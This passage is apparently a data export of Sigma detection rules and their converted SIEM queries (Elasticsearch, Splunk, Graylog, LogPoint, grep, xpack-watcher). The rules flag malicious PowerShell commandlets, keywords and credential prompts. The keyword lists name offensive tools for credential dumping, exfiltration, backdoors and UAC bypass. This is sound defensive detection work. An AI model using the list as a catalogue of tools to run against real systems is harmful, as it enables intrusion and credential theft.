*Out\\\\\\\\-Minidump* OR *VolumeShadowCopyTools* OR *Invoke\\\\\\\\-ReflectivePEInjection* OR *Invoke\\\\\\\\-UserHunter* OR *Find\\\\\\\\-GPOLocation* OR *Invoke\\\\\\\\-ACLScanner* OR *Invoke\\\\\\\\-DowngradeAccount* OR *Get\\\\\\\\-ServiceUnquoted* OR *Get\\\\\\\\-ServiceFilePermission* OR *Get\\\\\\\\-ServicePermission* OR *Invoke\\\\\\\\-ServiceAbuse* OR *Install\\\\\\\\-ServiceBinary* OR *Get\\\\\\\\-RegAutoLogon* OR *Get\\\\\\\\-VulnAutoRun* OR *Get\\\\\\\\-VulnSchTask* OR *Get\\\\\\\\-UnattendedInstallFile* OR *Get\\\\\\\\-ApplicationHost* OR *Get\\\\\\\\-RegAlwaysInstallElevated* OR *Get\\\\\\\\-Unconstrained* OR *Add\\\\\\\\-RegBackdoor* OR *Add\\\\\\\\-ScrnSaveBackdoor* OR *Gupt\\\\\\\\-Backdoor* OR *Invoke\\\\\\\\-ADSBackdoor* OR *Enabled\\\\\\\\-DuplicateToken* OR *Invoke\\\\\\\\-PsUaCme* OR *Remove\\\\\\\\-Update* OR *Check\\\\\\\\-VM* OR *Get\\\\\\\\-LSASecret* OR *Get\\\\\\\\-PassHashes* OR *Show\\\\\\\\-TargetScreen* OR *Port\\\\\\\\-Scan* OR *Invoke\\\\\\\\-PoshRatHttp* OR *Invoke\\\\\\\\-PowerShellTCP* OR *Invoke\\\\\\\\-PowerShellWMI* OR *Add\\\\\\\\-Exfiltration* OR *Add\\\\\\\\-Persistence* OR *Do\\\\\\\\-Exfiltration* OR *Start\\\\\\\\-CaptureServer* OR *Get\\\\\\\\-ChromeDump* OR *Get\\\\\\\\-ClipboardContents* OR *Get\\\\\\\\-FoxDump* OR *Get\\\\\\\\-IndexedItem* OR *Get\\\\\\\\-Screenshot* OR *Invoke\\\\\\\\-Inveigh* OR *Invoke\\\\\\\\-NetRipper* OR *Invoke\\\\\\\\-EgressCheck* OR *Invoke\\\\\\\\-PostExfil* OR *Invoke\\\\\\\\-PSInject* OR *Invoke\\\\\\\\-RunAs* OR *MailRaider* OR *New\\\\\\\\-HoneyHash* OR *Set\\\\\\\\-MacAttribute* OR *Invoke\\\\\\\\-DCSync* OR *Invoke\\\\\\\\-PowerDump* OR *Exploit\\\\\\\\-Jboss* OR *Invoke\\\\\\\\-ThunderStruck* OR *Invoke\\\\\\\\-VoiceTroll* OR *Set\\\\\\\\-Wallpaper* OR *Invoke\\\\\\\\-InveighRelay* OR *Invoke\\\\\\\\-PsExec* OR *Invoke\\\\\\\\-SSHCommand* OR *Get\\\\\\\\-SecurityPackages* OR *Install\\\\\\\\-SSP* OR *Invoke\\\\\\\\-BackdoorLNK* OR *PowerBreach* OR *Get\\\\\\\\-SiteListPassword* OR *Get\\\\\\\\-System* OR *Invoke\\\\\\\\-BypassUAC* OR *Invoke\\\\\\\\-Tater* OR *Invoke\\\\\\\\-WScriptBypassUAC* OR *PowerUp* OR *PowerView* OR *Get\\\\\\\\-RickAstley* OR *Find\\\\\\\\-Fruit* OR *HTTP\\\\\\\\-Login* OR *Find\\\\\\\\-TrustedDocuments* OR *Invoke\\\\\\\\-Paranoia* OR *Invoke\\\\\\\\-WinEnum* OR *Invoke\\\\\\\\-ARPScan* OR *Invoke\\\\\\\\-PortScan* OR *Invoke\\\\\\\\-ReverseDNSLookup* OR *Invoke\\\\\\\\-SMBScanner* OR *Invoke\\\\\\\\-Mimikittenz*) AND (NOT \\\\\\\\*.keyword:(*Get\\\\\\\\-SystemDriveInfo*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Malicious PowerShell Commandlets\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Message.keyword:(*Invoke\\\\-DllInjection* *Invoke\\\\-Shellcode* *Invoke\\\\-WmiCommand* *Get\\\\-GPPPassword* *Get\\\\-Keystrokes* *Get\\\\-TimedScreenshot* *Get\\\\-VaultCredential* *Invoke\\\\-CredentialInjection* *Invoke\\\\-Mimikatz* *Invoke\\\\-NinjaCopy* *Invoke\\\\-TokenManipulation* *Out\\\\-Minidump* *VolumeShadowCopyTools* *Invoke\\\\-ReflectivePEInjection* *Invoke\\\\-UserHunter* *Find\\\\-GPOLocation* *Invoke\\\\-ACLScanner* *Invoke\\\\-DowngradeAccount* *Get\\\\-ServiceUnquoted* *Get\\\\-ServiceFilePermission* *Get\\\\-ServicePermission* *Invoke\\\\-ServiceAbuse* *Install\\\\-ServiceBinary* *Get\\\\-RegAutoLogon* *Get\\\\-VulnAutoRun* *Get\\\\-VulnSchTask* *Get\\\\-UnattendedInstallFile* *Get\\\\-ApplicationHost* *Get\\\\-RegAlwaysInstallElevated* *Get\\\\-Unconstrained* *Add\\\\-RegBackdoor* *Add\\\\-ScrnSaveBackdoor* *Gupt\\\\-Backdoor* *Invoke\\\\-ADSBackdoor* *Enabled\\\\-DuplicateToken* *Invoke\\\\-PsUaCme* *Remove\\\\-Update* *Check\\\\-VM* *Get\\\\-LSASecret* *Get\\\\-PassHashes* *Show\\\\-TargetScreen* *Port\\\\-Scan* *Invoke\\\\-PoshRatHttp* *Invoke\\\\-PowerShellTCP* *Invoke\\\\-PowerShellWMI* *Add\\\\-Exfiltration* *Add\\\\-Persistence* *Do\\\\-Exfiltration* *Start\\\\-CaptureServer* *Get\\\\-ChromeDump* *Get\\\\-ClipboardContents* *Get\\\\-FoxDump* *Get\\\\-IndexedItem* *Get\\\\-Screenshot* *Invoke\\\\-Inveigh* *Invoke\\\\-NetRipper* *Invoke\\\\-EgressCheck* *Invoke\\\\-PostExfil* *Invoke\\\\-PSInject* *Invoke\\\\-RunAs* *MailRaider* *New\\\\-HoneyHash* *Set\\\\-MacAttribute* *Invoke\\\\-DCSync* *Invoke\\\\-PowerDump* *Exploit\\\\-Jboss* *Invoke\\\\-ThunderStruck* *Invoke\\\\-VoiceTroll* *Set\\\\-Wallpaper* *Invoke\\\\-InveighRelay* *Invoke\\\\-PsExec* *Invoke\\\\-SSHCommand* *Get\\\\-SecurityPackages* *Install\\\\-SSP* *Invoke\\\\-BackdoorLNK* *PowerBreach* *Get\\\\-SiteListPassword* *Get\\\\-System* *Invoke\\\\-BypassUAC* *Invoke\\\\-Tater* *Invoke\\\\-WScriptBypassUAC* *PowerUp* *PowerView* *Get\\\\-RickAstley* *Find\\\\-Fruit* *HTTP\\\\-Login* *Find\\\\-TrustedDocuments* *Invoke\\\\-Paranoia* *Invoke\\\\-WinEnum* *Invoke\\\\-ARPScan* *Invoke\\\\-PortScan* *Invoke\\\\-ReverseDNSLookup* *Invoke\\\\-SMBScanner* *Invoke\\\\-Mimikittenz*) AND (NOT \\\\*.keyword:(*Get\\\\-SystemDriveInfo*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Message=\"*Invoke-DllInjection*\" OR Message=\"*Invoke-Shellcode*\" OR Message=\"*Invoke-WmiCommand*\" OR Message=\"*Get-GPPPassword*\" OR Message=\"*Get-Keystrokes*\" OR Message=\"*Get-TimedScreenshot*\" OR Message=\"*Get-VaultCredential*\" OR Message=\"*Invoke-CredentialInjection*\" OR Message=\"*Invoke-Mimikatz*\" OR Message=\"*Invoke-NinjaCopy*\" OR Message=\"*Invoke-TokenManipulation*\" OR Message=\"*Out-Minidump*\" OR Message=\"*VolumeShadowCopyTools*\" OR Message=\"*Invoke-ReflectivePEInjection*\" OR Message=\"*Invoke-UserHunter*\" OR Message=\"*Find-GPOLocation*\" OR Message=\"*Invoke-ACLScanner*\" OR Message=\"*Invoke-DowngradeAccount*\" OR Message=\"*Get-ServiceUnquoted*\" OR Message=\"*Get-ServiceFilePermission*\" OR Message=\"*Get-ServicePermission*\" OR Message=\"*Invoke-ServiceAbuse*\" OR Message=\"*Install-ServiceBinary*\" OR Message=\"*Get-RegAutoLogon*\" OR Message=\"*Get-VulnAutoRun*\" OR Message=\"*Get-VulnSchTask*\" OR Message=\"*Get-UnattendedInstallFile*\" OR Message=\"*Get-ApplicationHost*\" OR Message=\"*Get-RegAlwaysInstallElevated*\" OR Message=\"*Get-Unconstrained*\" OR Message=\"*Add-RegBackdoor*\" OR Message=\"*Add-ScrnSaveBackdoor*\" OR Message=\"*Gupt-Backdoor*\" OR Message=\"*Invoke-ADSBackdoor*\" OR Message=\"*Enabled-DuplicateToken*\" OR Message=\"*Invoke-PsUaCme*\" OR Message=\"*Remove-Update*\" OR Message=\"*Check-VM*\" OR Message=\"*Get-LSASecret*\" OR Message=\"*Get-PassHashes*\" OR Message=\"*Show-TargetScreen*\" OR Message=\"*Port-Scan*\" OR Message=\"*Invoke-PoshRatHttp*\" OR Message=\"*Invoke-PowerShellTCP*\" OR Message=\"*Invoke-PowerShellWMI*\" OR Message=\"*Add-Exfiltration*\" OR Message=\"*Add-Persistence*\" OR Message=\"*Do-Exfiltration*\" OR Message=\"*Start-CaptureServer*\" OR Message=\"*Get-ChromeDump*\" OR Message=\"*Get-ClipboardContents*\" OR Message=\"*Get-FoxDump*\" OR Message=\"*Get-IndexedItem*\" OR Message=\"*Get-Screenshot*\" OR Message=\"*Invoke-Inveigh*\" OR Message=\"*Invoke-NetRipper*\" OR Message=\"*Invoke-EgressCheck*\" OR Message=\"*Invoke-PostExfil*\" OR Message=\"*Invoke-PSInject*\" OR Message=\"*Invoke-RunAs*\" OR Message=\"*MailRaider*\" OR Message=\"*New-HoneyHash*\" OR Message=\"*Set-MacAttribute*\" OR Message=\"*Invoke-DCSync*\" OR Message=\"*Invoke-PowerDump*\" OR Message=\"*Exploit-Jboss*\" OR Message=\"*Invoke-ThunderStruck*\" OR Message=\"*Invoke-VoiceTroll*\" OR Message=\"*Set-Wallpaper*\" OR Message=\"*Invoke-InveighRelay*\" OR Message=\"*Invoke-PsExec*\" OR Message=\"*Invoke-SSHCommand*\" OR Message=\"*Get-SecurityPackages*\" OR Message=\"*Install-SSP*\" OR Message=\"*Invoke-BackdoorLNK*\" OR Message=\"*PowerBreach*\" OR Message=\"*Get-SiteListPassword*\" OR Message=\"*Get-System*\" OR Message=\"*Invoke-BypassUAC*\" OR Message=\"*Invoke-Tater*\" OR Message=\"*Invoke-WScriptBypassUAC*\" OR Message=\"*PowerUp*\" OR Message=\"*PowerView*\" OR Message=\"*Get-RickAstley*\" OR Message=\"*Find-Fruit*\" OR Message=\"*HTTP-Login*\" OR Message=\"*Find-TrustedDocuments*\" OR Message=\"*Invoke-Paranoia*\" OR Message=\"*Invoke-WinEnum*\" OR Message=\"*Invoke-ARPScan*\" OR Message=\"*Invoke-PortScan*\" OR Message=\"*Invoke-ReverseDNSLookup*\" OR Message=\"*Invoke-SMBScanner*\" OR Message=\"*Invoke-Mimikittenz*\") NOT (\"Get-SystemDriveInfo\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(Message IN [\"*Invoke-DllInjection*\", \"*Invoke-Shellcode*\", \"*Invoke-WmiCommand*\", \"*Get-GPPPassword*\", \"*Get-Keystrokes*\", \"*Get-TimedScreenshot*\", \"*Get-VaultCredential*\", \"*Invoke-CredentialInjection*\", \"*Invoke-Mimikatz*\", \"*Invoke-NinjaCopy*\", \"*Invoke-TokenManipulation*\", \"*Out-Minidump*\", \"*VolumeShadowCopyTools*\", \"*Invoke-ReflectivePEInjection*\", \"*Invoke-UserHunter*\", \"*Find-GPOLocation*\", \"*Invoke-ACLScanner*\", \"*Invoke-DowngradeAccount*\", \"*Get-ServiceUnquoted*\", \"*Get-ServiceFilePermission*\", \"*Get-ServicePermission*\", \"*Invoke-ServiceAbuse*\", \"*Install-ServiceBinary*\", \"*Get-RegAutoLogon*\", \"*Get-VulnAutoRun*\", \"*Get-VulnSchTask*\", \"*Get-UnattendedInstallFile*\", \"*Get-ApplicationHost*\", \"*Get-RegAlwaysInstallElevated*\", \"*Get-Unconstrained*\", \"*Add-RegBackdoor*\", \"*Add-ScrnSaveBackdoor*\", \"*Gupt-Backdoor*\", \"*Invoke-ADSBackdoor*\", \"*Enabled-DuplicateToken*\", \"*Invoke-PsUaCme*\", \"*Remove-Update*\", \"*Check-VM*\", \"*Get-LSASecret*\", \"*Get-PassHashes*\", \"*Show-TargetScreen*\", \"*Port-Scan*\", \"*Invoke-PoshRatHttp*\", \"*Invoke-PowerShellTCP*\", \"*Invoke-PowerShellWMI*\", \"*Add-Exfiltration*\", \"*Add-Persistence*\", \"*Do-Exfiltration*\", \"*Start-CaptureServer*\", \"*Get-ChromeDump*\", \"*Get-ClipboardContents*\", \"*Get-FoxDump*\", \"*Get-IndexedItem*\", \"*Get-Screenshot*\", \"*Invoke-Inveigh*\", \"*Invoke-NetRipper*\", \"*Invoke-EgressCheck*\", \"*Invoke-PostExfil*\", \"*Invoke-PSInject*\", \"*Invoke-RunAs*\", \"*MailRaider*\", \"*New-HoneyHash*\", \"*Set-MacAttribute*\", \"*Invoke-DCSync*\", \"*Invoke-PowerDump*\", \"*Exploit-Jboss*\", \"*Invoke-ThunderStruck*\", \"*Invoke-VoiceTroll*\", \"*Set-Wallpaper*\", \"*Invoke-InveighRelay*\", \"*Invoke-PsExec*\", \"*Invoke-SSHCommand*\", \"*Get-SecurityPackages*\", \"*Install-SSP*\", \"*Invoke-BackdoorLNK*\", \"*PowerBreach*\", \"*Get-SiteListPassword*\", \"*Get-System*\", \"*Invoke-BypassUAC*\", \"*Invoke-Tater*\", \"*Invoke-WScriptBypassUAC*\", \"*PowerUp*\", \"*PowerView*\", \"*Get-RickAstley*\", \"*Find-Fruit*\", \"*HTTP-Login*\", \"*Find-TrustedDocuments*\", \"*Invoke-Paranoia*\", \"*Invoke-WinEnum*\", \"*Invoke-ARPScan*\", \"*Invoke-PortScan*\", \"*Invoke-ReverseDNSLookup*\", \"*Invoke-SMBScanner*\", \"*Invoke-Mimikittenz*\"]  -(\"Get-SystemDriveInfo\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*Invoke-DllInjection.*|.*.*Invoke-Shellcode.*|.*.*Invoke-WmiCommand.*|.*.*Get-GPPPassword.*|.*.*Get-Keystrokes.*|.*.*Get-TimedScreenshot.*|.*.*Get-VaultCredential.*|.*.*Invoke-CredentialInjection.*|.*.*Invoke-Mimikatz.*|.*.*Invoke-NinjaCopy.*|.*.*Invoke-TokenManipulation.*|.*.*Out-Minidump.*|.*.*VolumeShadowCopyTools.*|.*.*Invoke-ReflectivePEInjection.*|.*.*Invoke-UserHunter.*|.*.*Find-GPOLocation.*|.*.*Invoke-ACLScanner.*|.*.*Invoke-DowngradeAccount.*|.*.*Get-ServiceUnquoted.*|.*.*Get-ServiceFilePermission.*|.*.*Get-ServicePermission.*|.*.*Invoke-ServiceAbuse.*|.*.*Install-ServiceBinary.*|.*.*Get-RegAutoLogon.*|.*.*Get-VulnAutoRun.*|.*.*Get-VulnSchTask.*|.*.*Get-UnattendedInstallFile.*|.*.*Get-ApplicationHost.*|.*.*Get-RegAlwaysInstallElevated.*|.*.*Get-Unconstrained.*|.*.*Add-RegBackdoor.*|.*.*Add-ScrnSaveBackdoor.*|.*.*Gupt-Backdoor.*|.*.*Invoke-ADSBackdoor.*|.*.*Enabled-DuplicateToken.*|.*.*Invoke-PsUaCme.*|.*.*Remove-Update.*|.*.*Check-VM.*|.*.*Get-LSASecret.*|.*.*Get-PassHashes.*|.*.*Show-TargetScreen.*|.*.*Port-Scan.*|.*.*Invoke-PoshRatHttp.*|.*.*Invoke-PowerShellTCP.*|.*.*Invoke-PowerShellWMI.*|.*.*Add-Exfiltration.*|.*.*Add-Persistence.*|.*.*Do-Exfiltration.*|.*.*Start-CaptureServer.*|.*.*Get-ChromeDump.*|.*.*Get-ClipboardContents.*|.*.*Get-FoxDump.*|.*.*Get-IndexedItem.*|.*.*Get-Screenshot.*|.*.*Invoke-Inveigh.*|.*.*Invoke-NetRipper.*|.*.*Invoke-EgressCheck.*|.*.*Invoke-PostExfil.*|.*.*Invoke-PSInject.*|.*.*Invoke-RunAs.*|.*.*MailRaider.*|.*.*New-HoneyHash.*|.*.*Set-MacAttribute.*|.*.*Invoke-DCSync.*|.*.*Invoke-PowerDump.*|.*.*Exploit-Jboss.*|.*.*Invoke-ThunderStruck.*|.*.*Invoke-VoiceTroll.*|.*.*Set-Wallpaper.*|.*.*Invoke-InveighRelay.*|.*.*Invoke-PsExec.*|.*.*Invoke-SSHCommand.*|.*.*Get-SecurityPackages.*|.*.*Install-SSP.*|.*.*Invoke-BackdoorLNK.*|.*.*PowerBreach.*|.*.*Get-SiteListPassword.*|.*.*Get-System.*|.*.*Invoke-BypassUAC.*|.*.*Invoke-Tater.*|.*.*Invoke-WScriptBypassUAC.*|.*.*PowerUp.*|.*.*PowerView.*|.*.*Get-RickAstley.*|.*.*Find-Fruit.*|.*.*HTTP-Login.*|.*.*Find-TrustedDocuments.*|.*.*Invoke-Paranoia.*|.*.*Invoke-WinEnum.*|.*.*Invoke-ARPScan.*|.*.*Invoke-PortScan.*|.*.*Invoke-ReverseDNSLookup.*|.*.*Invoke-SMBScanner.*|.*.*Invoke-Mimikittenz.*))(?=.*(?!.*(?:.*(?:.*Get-SystemDriveInfo)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Malicious PowerShell Keywords\nid: f62176f3-8128-4faa-bf6c-83261322e5eb\nstatus: experimental\ndescription: Detects keywords from well-known PowerShell exploitation frameworks\nmodified: 2019/01/22\nreferences:\n    - https://adsecurity.org/?p=2921\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: Sean Metcalf (source), Florian Roth (rule)\nlogsource:\n    product: windows\n    service: powershell\n    definition: 'It is recommended to use the new \"Script Block Logging\" of PowerShell v5 https://adsecurity.org/?p=2277'\ndetection:\n    keywords:\n        Message:\n            - \"*AdjustTokenPrivileges*\"\n            - \"*IMAGE_NT_OPTIONAL_HDR64_MAGIC*\"\n            - \"*Microsoft.Win32.UnsafeNativeMethods*\"\n            - \"*ReadProcessMemory.Invoke*\"\n            - \"*SE_PRIVILEGE_ENABLED*\"\n            - \"*LSA_UNICODE_STRING*\"\n            - \"*MiniDumpWriteDump*\"\n            - \"*PAGE_EXECUTE_READ*\"\n            - \"*SECURITY_DELEGATION*\"\n            - \"*TOKEN_ADJUST_PRIVILEGES*\"\n            - \"*TOKEN_ALL_ACCESS*\"\n            - \"*TOKEN_ASSIGN_PRIMARY*\"\n            - \"*TOKEN_DUPLICATE*\"\n            - \"*TOKEN_ELEVATION*\"\n            - \"*TOKEN_IMPERSONATE*\"\n            - \"*TOKEN_INFORMATION_CLASS*\"\n            - \"*TOKEN_PRIVILEGES*\"\n            - \"*TOKEN_QUERY*\"\n            - \"*Metasploit*\"\n            - \"*Mimikatz*\"\n    condition: keywords\nfalsepositives:\n    - Penetration tests\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Malicious PowerShell Keywords\nid: f62176f3-8128-4faa-bf6c-83261322e5eb\nstatus: experimental\ndescription: Detects keywords from well-known PowerShell exploitation frameworks\nmodified: 2019/01/22\nreferences:\n    - https://adsecurity.org/?p=2921\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: Sean Metcalf (source), Florian Roth (rule)\nlogsource:\n    product: windows\n    service: powershell\n    definition: 'It is recommended to use the new \"Script Block Logging\" of PowerShell v5 https://adsecurity.org/?p=2277'\ndetection:\n    keywords:\n        Message:\n            - \"*AdjustTokenPrivileges*\"\n            - \"*IMAGE_NT_OPTIONAL_HDR64_MAGIC*\"\n            - \"*Microsoft.Win32.UnsafeNativeMethods*\"\n            - \"*ReadProcessMemory.Invoke*\"\n            - \"*SE_PRIVILEGE_ENABLED*\"\n            - \"*LSA_UNICODE_STRING*\"\n            - \"*MiniDumpWriteDump*\"\n            - \"*PAGE_EXECUTE_READ*\"\n            - \"*SECURITY_DELEGATION*\"\n            - \"*TOKEN_ADJUST_PRIVILEGES*\"\n            - \"*TOKEN_ALL_ACCESS*\"\n            - \"*TOKEN_ASSIGN_PRIMARY*\"\n            - \"*TOKEN_DUPLICATE*\"\n            - \"*TOKEN_ELEVATION*\"\n            - \"*TOKEN_IMPERSONATE*\"\n            - \"*TOKEN_INFORMATION_CLASS*\"\n            - \"*TOKEN_PRIVILEGES*\"\n            - \"*TOKEN_QUERY*\"\n            - \"*Metasploit*\"\n            - \"*Mimikatz*\"\n    condition: keywords\nfalsepositives:\n    - Penetration tests\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "Message.keyword:(*AdjustTokenPrivileges* OR *IMAGE_NT_OPTIONAL_HDR64_MAGIC* OR *Microsoft.Win32.UnsafeNativeMethods* OR *ReadProcessMemory.Invoke* OR *SE_PRIVILEGE_ENABLED* OR *LSA_UNICODE_STRING* OR *MiniDumpWriteDump* OR *PAGE_EXECUTE_READ* OR *SECURITY_DELEGATION* OR *TOKEN_ADJUST_PRIVILEGES* OR *TOKEN_ALL_ACCESS* OR *TOKEN_ASSIGN_PRIMARY* OR *TOKEN_DUPLICATE* OR *TOKEN_ELEVATION* OR *TOKEN_IMPERSONATE* OR *TOKEN_INFORMATION_CLASS* OR *TOKEN_PRIVILEGES* OR *TOKEN_QUERY* OR *Metasploit* OR *Mimikatz*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Malicious-PowerShell-Keywords <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Malicious PowerShell Keywords\",\\n    \"description\": \"Detects keywords from well-known PowerShell exploitation frameworks\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"Message.keyword:(*AdjustTokenPrivileges* OR *IMAGE_NT_OPTIONAL_HDR64_MAGIC* OR *Microsoft.Win32.UnsafeNativeMethods* OR *ReadProcessMemory.Invoke* OR *SE_PRIVILEGE_ENABLED* OR *LSA_UNICODE_STRING* OR *MiniDumpWriteDump* OR *PAGE_EXECUTE_READ* OR *SECURITY_DELEGATION* OR *TOKEN_ADJUST_PRIVILEGES* OR *TOKEN_ALL_ACCESS* OR *TOKEN_ASSIGN_PRIMARY* OR *TOKEN_DUPLICATE* OR *TOKEN_ELEVATION* OR *TOKEN_IMPERSONATE* OR *TOKEN_INFORMATION_CLASS* OR *TOKEN_PRIVILEGES* OR *TOKEN_QUERY* OR *Metasploit* OR *Mimikatz*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"Message.keyword:(*AdjustTokenPrivileges* OR *IMAGE_NT_OPTIONAL_HDR64_MAGIC* OR *Microsoft.Win32.UnsafeNativeMethods* OR *ReadProcessMemory.Invoke* OR *SE_PRIVILEGE_ENABLED* OR *LSA_UNICODE_STRING* OR *MiniDumpWriteDump* OR *PAGE_EXECUTE_READ* OR *SECURITY_DELEGATION* OR *TOKEN_ADJUST_PRIVILEGES* OR *TOKEN_ALL_ACCESS* OR *TOKEN_ASSIGN_PRIMARY* OR *TOKEN_DUPLICATE* OR *TOKEN_ELEVATION* OR *TOKEN_IMPERSONATE* OR *TOKEN_INFORMATION_CLASS* OR *TOKEN_PRIVILEGES* OR *TOKEN_QUERY* OR *Metasploit* OR *Mimikatz*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Malicious PowerShell Keywords\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "Message.keyword:(*AdjustTokenPrivileges* *IMAGE_NT_OPTIONAL_HDR64_MAGIC* *Microsoft.Win32.UnsafeNativeMethods* *ReadProcessMemory.Invoke* *SE_PRIVILEGE_ENABLED* *LSA_UNICODE_STRING* *MiniDumpWriteDump* *PAGE_EXECUTE_READ* *SECURITY_DELEGATION* *TOKEN_ADJUST_PRIVILEGES* *TOKEN_ALL_ACCESS* *TOKEN_ASSIGN_PRIMARY* *TOKEN_DUPLICATE* *TOKEN_ELEVATION* *TOKEN_IMPERSONATE* *TOKEN_INFORMATION_CLASS* *TOKEN_PRIVILEGES* *TOKEN_QUERY* *Metasploit* *Mimikatz*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Message=\"*AdjustTokenPrivileges*\" OR Message=\"*IMAGE_NT_OPTIONAL_HDR64_MAGIC*\" OR Message=\"*Microsoft.Win32.UnsafeNativeMethods*\" OR Message=\"*ReadProcessMemory.Invoke*\" OR Message=\"*SE_PRIVILEGE_ENABLED*\" OR Message=\"*LSA_UNICODE_STRING*\" OR Message=\"*MiniDumpWriteDump*\" OR Message=\"*PAGE_EXECUTE_READ*\" OR Message=\"*SECURITY_DELEGATION*\" OR Message=\"*TOKEN_ADJUST_PRIVILEGES*\" OR Message=\"*TOKEN_ALL_ACCESS*\" OR Message=\"*TOKEN_ASSIGN_PRIMARY*\" OR Message=\"*TOKEN_DUPLICATE*\" OR Message=\"*TOKEN_ELEVATION*\" OR Message=\"*TOKEN_IMPERSONATE*\" OR Message=\"*TOKEN_INFORMATION_CLASS*\" OR Message=\"*TOKEN_PRIVILEGES*\" OR Message=\"*TOKEN_QUERY*\" OR Message=\"*Metasploit*\" OR Message=\"*Mimikatz*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "Message IN [\"*AdjustTokenPrivileges*\", \"*IMAGE_NT_OPTIONAL_HDR64_MAGIC*\", \"*Microsoft.Win32.UnsafeNativeMethods*\", \"*ReadProcessMemory.Invoke*\", \"*SE_PRIVILEGE_ENABLED*\", \"*LSA_UNICODE_STRING*\", \"*MiniDumpWriteDump*\", \"*PAGE_EXECUTE_READ*\", \"*SECURITY_DELEGATION*\", \"*TOKEN_ADJUST_PRIVILEGES*\", \"*TOKEN_ALL_ACCESS*\", \"*TOKEN_ASSIGN_PRIMARY*\", \"*TOKEN_DUPLICATE*\", \"*TOKEN_ELEVATION*\", \"*TOKEN_IMPERSONATE*\", \"*TOKEN_INFORMATION_CLASS*\", \"*TOKEN_PRIVILEGES*\", \"*TOKEN_QUERY*\", \"*Metasploit*\", \"*Mimikatz*\"]", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*AdjustTokenPrivileges.*|.*.*IMAGE_NT_OPTIONAL_HDR64_MAGIC.*|.*.*Microsoft\\\\.Win32\\\\.UnsafeNativeMethods.*|.*.*ReadProcessMemory\\\\.Invoke.*|.*.*SE_PRIVILEGE_ENABLED.*|.*.*LSA_UNICODE_STRING.*|.*.*MiniDumpWriteDump.*|.*.*PAGE_EXECUTE_READ.*|.*.*SECURITY_DELEGATION.*|.*.*TOKEN_ADJUST_PRIVILEGES.*|.*.*TOKEN_ALL_ACCESS.*|.*.*TOKEN_ASSIGN_PRIMARY.*|.*.*TOKEN_DUPLICATE.*|.*.*TOKEN_ELEVATION.*|.*.*TOKEN_IMPERSONATE.*|.*.*TOKEN_INFORMATION_CLASS.*|.*.*TOKEN_PRIVILEGES.*|.*.*TOKEN_QUERY.*|.*.*Metasploit.*|.*.*Mimikatz.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: PowerShell Credential Prompt\nid: ca8b77a9-d499-4095-b793-5d5f330d450e\nstatus: experimental\ndescription: Detects PowerShell calling a credential prompt\nreferences:\n    - https://twitter.com/JohnLaTwC/status/850381440629981184\n    - https://t.co/ezOTGy1a1G\ntags:\n    - attack.execution\n    - attack.credential_access    \n    - attack.t1086\nauthor: John Lambert (idea), Florian Roth (rule)\nlogsource:\n    product: windows\n    service: powershell\n    definition: 'Script block logging must be enabled'\ndetection:\n    selection:\n        EventID: 4104\n    keyword:\n        Message:\n            - '*PromptForCredential*'\n    condition: all of them\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma 